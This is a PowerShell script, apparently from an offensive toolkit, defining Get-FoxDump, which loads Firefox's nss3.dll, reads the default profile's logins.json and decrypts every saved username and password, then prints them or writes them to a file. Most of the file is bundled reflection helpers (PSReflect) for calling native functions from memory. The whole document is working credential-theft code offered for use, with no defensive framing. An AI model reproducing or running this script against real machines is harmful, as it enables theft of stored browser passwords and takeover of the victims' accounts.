Function Get-FoxDump 
{
    <#
    .SYNOPSIS 
    This script will utilize the api functions within the nss3.dll to decrypt saved passwords. This will only be successfull if the masterpassword has not been set.

    .DESCRIPTION
    This script will utilize the api functions within the nss3.dll to decrypt saved passwords and output them to the pipeline. This will only be successfull if the master 
    password has not been set. The results will include the username, password, and form submit url. This script should work with Firefox version 32 and above. Earlier
    versions utilized a different storage method for passwords. 

    .PARAMETER OutFile
    Path to the file where the results should be written to. 

    .EXAMPLE

    Get-FoxDump -OutFile "passwords.txt" 

    This will retrieve any saved passwords in firefox and then write them out to a file name passwords.txt. 


    #>

    #References: http://xakfor.net/threads/c-firefox-36-password-cookie-recovery.12192/

    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $False)]
        [string]$OutFile

    )
    #PSREFLECT CODE
    function New-InMemoryModule
  {
    <#
    .SYNOPSIS

    Creates an in-memory assembly and module

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
    .DESCRIPTION

    When defining custom enums, structs, and unmanaged functions, it is
    necessary to associate to an assembly module. This helper function
    creates an in-memory module that can be passed to the 'enum',
    'struct', and Add-Win32Type functions.

    .PARAMETER ModuleName

    Specifies the desired name for the in-memory assembly and module. If
    ModuleName is not provided, it will default to a GUID.

    .EXAMPLE

    $Module = New-InMemoryModule -ModuleName Win32
    #>

        Param
        (
            [Parameter(Position = 0)]
            [ValidateNotNullOrEmpty()]
            [String]
            $ModuleName = [Guid]::NewGuid().ToString()
        )

        $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

        foreach ($Assembly in $LoadedAssemblies) {
            if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
                return $Assembly
            }
        }

        $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
        $Domain = [AppDomain]::CurrentDomain
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

        return $ModuleBuilder
    }


  # A helper function used to reduce typing while defining function
  # prototypes for Add-Win32Type.
  function func
  {
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [String]
            $DllName,

            [Parameter(Position = 1, Mandatory = $True)]
            [string]
            $FunctionName,

            [Parameter(Position = 2, Mandatory = $True)]
            [Type]
            $ReturnType,

            [Parameter(Position = 3)]
            [Type[]]
            $ParameterTypes,

            [Parameter(Position = 4)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention,

            [Parameter(Position = 5)]
            [Runtime.InteropServices.CharSet]
            $Charset,

            [Switch]
            $SetLastError
        )

        $Properties = @{
            DllName = $DllName
            FunctionName = $FunctionName
            ReturnType = $ReturnType
        }

        if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
        if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
        if ($Charset) { $Properties['Charset'] = $Charset }
        if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

        New-Object PSObject -Property $Properties
    }


  function Add-Win32Type
  {
    <#
    .SYNOPSIS

    Creates a .NET type for an unmanaged Win32 function.

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: func
 
    .DESCRIPTION

    Add-Win32Type enables you to easily interact with unmanaged (i.e.
    Win32 unmanaged) functions in PowerShell. After providing
    Add-Win32Type with a function signature, a .NET type is created
    using reflection (i.e. csc.exe is never called like with Add-Type).

    The 'func' helper function can be used to reduce typing when defining
    multiple function definitions.

    .PARAMETER DllName

    The name of the DLL.

    .PARAMETER FunctionName

    The name of the target function.

    .PARAMETER ReturnType

    The return type of the function.

    .PARAMETER ParameterTypes

    The function parameters.

    .PARAMETER NativeCallingConvention

    Specifies the native calling convention of the function. Defaults to
    stdcall.

    .PARAMETER Charset

    If you need to explicitly call an 'A' or 'W' Win32 function, you can
    specify the character set.

    .PARAMETER SetLastError

    Indicates whether the callee calls the SetLastError Win32 API
    function before returning from the attributed method.

    .PARAMETER Module

    The in-memory module that will host the functions. Use
    New-InMemoryModule to define an in-memory module.

    .PARAMETER Namespace

    An optional namespace to prepend to the type. Add-Win32Type defaults
    to a namespace consisting only of the name of the DLL.

    .EXAMPLE

    $Mod = New-InMemoryModule -ModuleName Win32

    $FunctionDefinitions = @(
      (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
      (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
      (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
    )

    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
    $Kernel32 = $Types['kernel32']
    $Ntdll = $Types['ntdll']
    $Ntdll::RtlGetCurrentPeb()
    $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
    $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

    .NOTES

    Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

    When defining multiple function prototypes, it is ideal to provide
    Add-Win32Type with an array of function signatures. That way, they
    are all incorporated into the same in-memory module.
    #>

        [OutputType([Hashtable])]
        Param(
            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [String]
            $DllName,

            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [String]
            $FunctionName,

            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [Type]
            $ReturnType,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Type[]]
            $ParameterTypes,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Runtime.InteropServices.CharSet]
            $Charset = [Runtime.InteropServices.CharSet]::Auto,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Switch]
            $SetLastError,

            [Parameter(Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,

            [ValidateNotNull()]
            [String]
            $Namespace = ''
        )

        BEGIN
        {
            $TypeHash = @{}
        }

        PROCESS
        {
            if ($Module -is [Reflection.Assembly])
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
                }
                else
                {
                    $TypeHash[$DllName] = $Module.GetType($DllName)
                }
            }
            else
            {
                # Define one type for each DLL
                if (!$TypeHash.ContainsKey($DllName))
                {
                    if ($Namespace)
                    {
                        $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                    }
                    else
                    {
                        $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                    }
                }

                $Method = $TypeHash[$DllName].DefineMethod(
                    $FunctionName,
                    'Public,Static,PinvokeImpl',
                    $ReturnType,
                    $ParameterTypes)

                # Make each ByRef parameter an Out parameter
                $i = 1
                foreach($Parameter in $ParameterTypes)
                {
                    if ($Parameter.IsByRef)
                    {
                        [void] $Method.DefineParameter($i, 'Out', $null)
                    }

                    $i++
                }

                $DllImport = [Runtime.InteropServices.DllImportAttribute]
                $SetLastErrorField = $DllImport.GetField('SetLastError')
                $CallingConventionField = $DllImport.GetField('CallingConvention')
                $CharsetField = $DllImport.GetField('CharSet')
                if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

                # Equivalent to C# version of [DllImport(DllName)]
                $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
                $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                    $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                    [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                    [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

                $Method.SetCustomAttribute($DllImportAttribute)
            }
        }

        END
        {
            if ($Module -is [Reflection.Assembly])
            {
                return $TypeHash
            }

            $ReturnTypes = @{}

            foreach ($Key in $TypeHash.Keys)
            {
                $Type = $TypeHash[$Key].CreateType()
            
                $ReturnTypes[$Key] = $Type
            }

            return $ReturnTypes
        }
    }


  function psenum
  {
    <#
    .SYNOPSIS

    Creates an in-memory enumeration for use in your PowerShell session.

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
    .DESCRIPTION

    The 'psenum' function facilitates the creation of enums entirely in
    memory using as close to a "C style" as PowerShell will allow.

    .PARAMETER Module

    The in-memory module that will host the enum. Use
    New-InMemoryModule to define an in-memory module.

    .PARAMETER FullName

    The fully-qualified name of the enum.

    .PARAMETER Type

    The type of each enum element.

    .PARAMETER EnumElements

    A hashtable of enum elements.

    .PARAMETER Bitfield

    Specifies that the enum should be treated as a bitfield.

    .EXAMPLE

    $Mod = New-InMemoryModule -ModuleName Win32

    $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
        UNKNOWN =                  0
        NATIVE =                   1 # Image doesn't require a subsystem.
        WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
        WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
        OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
        POSIX_CUI =                7 # Image runs in the Posix character subsystem.
        NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
        WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
        EFI_APPLICATION =          10
        EFI_BOOT_SERVICE_DRIVER =  11
        EFI_RUNTIME_DRIVER =       12
        EFI_ROM =                  13
        XBOX =                     14
        WINDOWS_BOOT_APPLICATION = 16
    }

    .NOTES

    PowerShell purists may disagree with the naming of this function but
    again, this was developed in such a way so as to emulate a "C style"
    definition as closely as possible. Sorry, I'm not going to name it
    New-Enum. :P
    #>

        [OutputType([Type])]
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,

            [Parameter(Position = 1, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [String]
            $FullName,

            [Parameter(Position = 2, Mandatory = $True)]
            [Type]
            $Type,

            [Parameter(Position = 3, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            $EnumElements,

            [Switch]
            $Bitfield
        )

        if ($Module -is [Reflection.Assembly])
        {
            return ($Module.GetType($FullName))
        }

        $EnumType = $Type -as [Type]

        $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

        if ($Bitfield)
        {
            $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
            $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
            $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
        }

        foreach ($Key in $EnumElements.Keys)
        {
            # Apply the specified enum type to each element
            $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
        }

        $EnumBuilder.CreateType()
    }


  # A helper function used to reduce typing while defining struct
  # fields.
  function field
  {
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [UInt16]
            $Position,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [Type]
            $Type,
        
            [Parameter(Position = 2)]
            [UInt16]
            $Offset,
        
            [Object[]]
            $MarshalAs
        )

        @{
            Position = $Position
            Type = $Type -as [Type]
            Offset = $Offset
            MarshalAs = $MarshalAs
        }
    }


  function struct
  {
        <#
        .SYNOPSIS

        Creates an in-memory struct for use in your PowerShell session.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: field
 
        .DESCRIPTION

        The 'struct' function facilitates the creation of structs entirely in
        memory using as close to a "C style" as PowerShell will allow. Struct
        fields are specified using a hashtable where each field of the struct
        is comprosed of the order in which it should be defined, its .NET
        type, and optionally, its offset and special marshaling attributes.

        One of the features of 'struct' is that after your struct is defined,
        it will come with a built-in GetSize method as well as an explicit
        converter so that you can easily cast an IntPtr to the struct without
        relying upon calling SizeOf and/or PtrToStructure in the Marshal
        class.

        .PARAMETER Module

        The in-memory module that will host the struct. Use
        New-InMemoryModule to define an in-memory module.

        .PARAMETER FullName

        The fully-qualified name of the struct.

        .PARAMETER StructFields

        A hashtable of fields. Use the 'field' helper function to ease
        defining each field.

        .PARAMETER PackingSize

        Specifies the memory alignment of fields.

        .PARAMETER ExplicitLayout

        Indicates that an explicit offset for each field will be specified.

        .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
            DOS_SIGNATURE =    0x5A4D
            OS2_SIGNATURE =    0x454E
            OS2_SIGNATURE_LE = 0x454C
            VXD_SIGNATURE =    0x454C
        }

        $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
            e_magic =    field 0 $ImageDosSignature
            e_cblp =     field 1 UInt16
            e_cp =       field 2 UInt16
            e_crlc =     field 3 UInt16
            e_cparhdr =  field 4 UInt16
            e_minalloc = field 5 UInt16
            e_maxalloc = field 6 UInt16
            e_ss =       field 7 UInt16
            e_sp =       field 8 UInt16
            e_csum =     field 9 UInt16
            e_ip =       field 10 UInt16
            e_cs =       field 11 UInt16
            e_lfarlc =   field 12 UInt16
            e_ovno =     field 13 UInt16
            e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
            e_oemid =    field 15 UInt16
            e_oeminfo =  field 16 UInt16
            e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
            e_lfanew =   field 18 Int32
        }

        # Example of using an explicit layout in order to create a union.
        $TestUnion = struct $Mod TestUnion @{
            field1 = field 0 UInt32 0
            field2 = field 1 IntPtr 0
        } -ExplicitLayout

        .NOTES

        PowerShell purists may disagree with the naming of this function but
        again, this was developed in such a way so as to emulate a "C style"
        definition as closely as possible. Sorry, I'm not going to name it
        New-Struct. :P
        #>

        [OutputType([Type])]
        Param
        (
            [Parameter(Position = 1, Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,

            [Parameter(Position = 2, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [String]
            $FullName,

            [Parameter(Position = 3, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            $StructFields,

            [Reflection.Emit.PackingSize]
            $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

            [Switch]
            $ExplicitLayout
        )

        if ($Module -is [Reflection.Assembly])
        {
            return ($Module.GetType($FullName))
        }

        [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
            Class,
            Public,
            Sealed,
            BeforeFieldInit'

        if ($ExplicitLayout)
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
        }
        else
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
        }

        $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

        $Fields = New-Object Hashtable[]($StructFields.Count)

        # Sort each field according to the orders specified
        # Unfortunately, PSv2 doesn't have the luxury of the
        # hashtable [Ordered] accelerator.
        foreach ($Field in $StructFields.Keys)
        {
            $Index = $StructFields[$Field]['Position']
            $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
        }

        foreach ($Field in $Fields)
        {
            $FieldName = $Field['FieldName']
            $FieldProp = $Field['Properties']

            $Offset = $FieldProp['Offset']
            $Type = $FieldProp['Type']
            $MarshalAs = $FieldProp['MarshalAs']

            $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

            if ($MarshalAs)
            {
                $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
                if ($MarshalAs[1])
                {
                    $Size = $MarshalAs[1]
                    $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                        $UnmanagedType, $SizeConst, @($Size))
                }
                else
                {
                    $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
                }
            
                $NewField.SetCustomAttribute($AttribBuilder)
            }

            if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
        }

        # Make the struct aware of its own size.
        # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
        $SizeMethod = $StructBuilder.DefineMethod('GetSize',
            'Public, Static',
            [Int],
            [Type[]] @())
        $ILGenerator = $SizeMethod.GetILGenerator()
        # Thanks for the help, Jason Shirk!
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
            [Type].GetMethod('GetTypeFromHandle'))
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
            [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

        # Allow for explicit casting from an IntPtr
        # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
        $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
            'PrivateScope, Public, Static, HideBySig, SpecialName',
            $StructBuilder,
            [Type[]] @([IntPtr]))
        $ILGenerator2 = $ImplicitConverter.GetILGenerator()
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
            [Type].GetMethod('GetTypeFromHandle'))
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
            [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

        $StructBuilder.CreateType()
    }
    #end of PSREFLECT CODE

    #http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html

    
   
    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    $Mod = New-InMemoryModule -ModuleName Win32

    $FunctionDefinitions = @(
        (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [string]) -Charset Ansi -SetLastError),
        (func kernel32 LoadLibrary ([IntPtr]) @([string]) -Charset Ansi -SetLastError),
        (func kernel32 FreeLibrary ([Bool]) @([IntPtr]) -Charset Ansi -SetLastError)
    )

    $TSECItem = struct $Mod TSECItem @{
        SECItemType    =    field 0 Int
        SECItemData    =    field 1 Int
        SECItemLen     =    field 2 Int
    }

    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
    $Kernel32 = $Types['kernel32']
    
    $nssdllhandle = [IntPtr]::Zero

    if([IntPtr]::Size -eq 8)
    {
        Throw "Unable to load 32-bit dll's in 64-bit process."
    }
    $mozillapath = "C:\Program Files (x86)\Mozilla Firefox"
    
    If(Test-Path $mozillapath)
    {
        
        
        $nss3dll = "$mozillapath\nss3.dll"
        
        $mozgluedll = "$mozillapath\mozglue.dll"
        $msvcr120dll = "$mozillapath\msvcr120.dll"
        $msvcp120dll = "$mozillapath\msvcp120.dll"
       
        if(Test-Path $msvcr120dll)
        {
         
            $msvcr120dllHandle = $Kernel32::LoadLibrary($msvcr120dll)
            $LastError= [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error when loading mozglue.dll: $LastError"
            
            
        }

        if(Test-Path $msvcp120dll)
        {
       
            $msvcp120dllHandle = $kernel32::LoadLibrary($msvcp120dll) 
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error loading mscvp120.dll: $LastError" 
            
        }

        if(Test-Path $mozgluedll)
        {
            
            $mozgluedllHandle = $Kernel32::LoadLibrary($mozgluedll) 
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last error loading msvcr120.dll: $LastError"
            
        }
        
        
        if(Test-Path $nss3dll)
        {
            
            $nssdllhandle = $Kernel32::LoadLibrary($nss3dll)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error loading nss3.dll: $LastError"       
            
        }
    }
    

    if(($nssdllhandle -eq 0) -or ($nssdllhandle -eq [IntPtr]::Zero))
    {
        Write-Warning "Could not load nss3.dll"
        Write-Verbose "Last Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        break
    }
   

    Function Decrypt-CipherText
    {
        param
        (
            [parameter(Mandatory=$True)]
            [string]$cipherText
        )

        #Cast the result from the Decode buffer function as a TSECItem struct and create an empty struct. Decrypt the cipher text and then
        #store it inside the empty struct.
        $Result = $NSSBase64_DecodeBuffer.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $cipherText, $cipherText.Length)
        Write-Verbose "[+]NSSBase64_DecodeBuffer Result: $Result"
        $ResultPtr = $Result -as [IntPtr]
        $offset = $ResultPtr.ToInt64()
        $newptr = New-Object System.IntPtr -ArgumentList $offset
        $TSECStructData = $newptr -as $TSECItem
        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($TSECStructData))
        $EmptyTSECItem = $ptr -as $TSECItem
        $result = $PK11SDR_Decrypt.Invoke([ref]$TSECStructData, [ref]$EmptyTSECItem, 0)
        Write-Verbose "[+]PK11SDR_Decrypt result:$result"
        if($result -eq 0)
        {

            if($EmptyTSECItem.SECItemLen -ne 0)
            {
                $size = $EmptyTSECItem.SECItemLen 
                $dataPtr = $EmptyTSECItem.SECItemData -as [IntPtr]
                $retval = New-Object byte[] $size
                [System.Runtime.InteropServices.Marshal]::Copy($dataPtr, $retval, 0, $size)
                $clearText = [System.Text.Encoding]::UTF8.GetString($retval)
                return $clearText
            }

        }

    }

    $NSSInitAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSS_Init")
    $NSSInitDelegates = Get-DelegateType @([string]) ([long])
    $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSInitAddr, $NSSInitDelegates)

    $NSSBase64_DecodeBufferAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSSBase64_DecodeBuffer")
    $NSSBase64_DecodeBufferDelegates = Get-DelegateType @([IntPtr], [IntPtr], [string], [int]) ([int])
    $NSSBase64_DecodeBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSBase64_DecodeBufferAddr, $NSSBase64_DecodeBufferDelegates)

    $PK11SDR_DecryptAddr = $Kernel32::GetProcAddress($nssdllhandle, "PK11SDR_Decrypt")
    $PK11SDR_DecryptDelegates = Get-DelegateType @([Type]$TSECItem.MakeByRefType(),[Type]$TSECItem.MakeByRefType(), [int]) ([int])
    $PK11SDR_Decrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11SDR_DecryptAddr, $PK11SDR_DecryptDelegates)
    
    $profilePath = "$($env:APPDATA)\Mozilla\Firefox\Profiles\*.default"
    
    $defaultProfile = $(Get-ChildItem $profilePath).FullName
    $NSSInitResult = $NSS_Init.Invoke($defaultProfile)
    Write-Verbose "[+]NSS_Init result: $NSSInitResult"
    

    if(Test-Path $defaultProfile)
    {
        #Web.extensions assembly is necessary for handling json files
        try
        {
           Add-Type -AssemblyName System.web.extensions 
        }
        catch
        {
            Write-Warning "Unable to load System.web.extensions assembly"
            break
        }
        

        $jsonFile = Get-Content "$defaultProfile\logins.json"
        if(!($jsonFile))
        {
            Write-Warning "Login information cannot be found in logins.json"
            break
        }
        $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
        $obj = $ser.DeserializeObject($jsonFile)

        
        $logins = $obj['logins']
        $count = ($logins.Count) - 1
        $passwordlist = @()
        #Iterate through each login entry and decrypt the username and password fields
        for($i = 0; $i -le $count; $i++)
        {
            Write-Verbose "[+]Decrypting login information..."
            $user = Decrypt-CipherText $($logins.GetValue($i)['encryptedUsername'])
            $pass = Decrypt-CipherText $($logins.GetValue($i)['encryptedPassword'])
            $formUrl = $($logins.GetValue($i)['formSubmitURL'])
            $FoxCreds = New-Object PSObject -Property @{
                UserName = $user 
                Password = $pass
                URL = $formUrl
            }
            $passwordlist += $FoxCreds
        }
        #Spit out the results to a file.... or not.
        if($OutFile)
        {
            $passwordlist | Format-List URL, UserName, Password | Out-File -Encoding ascii $OutFile
        }
        else
        {
            $passwordlist | Format-List URL, UserName, Password | Out-String
        }

        $kernel32::FreeLibrary($msvcp120dllHandle) | Out-Null
        $Kernel32::FreeLibrary($msvcr120dllHandle) | Out-Null
        $kernel32::FreeLibrary($mozgluedllHandle) | Out-Null
        $kernel32::FreeLibrary($nssdllhandle) | Out-Null
      
    }
    else
    {
        Write-Warning "Unable to locate default profile"
    }
    

}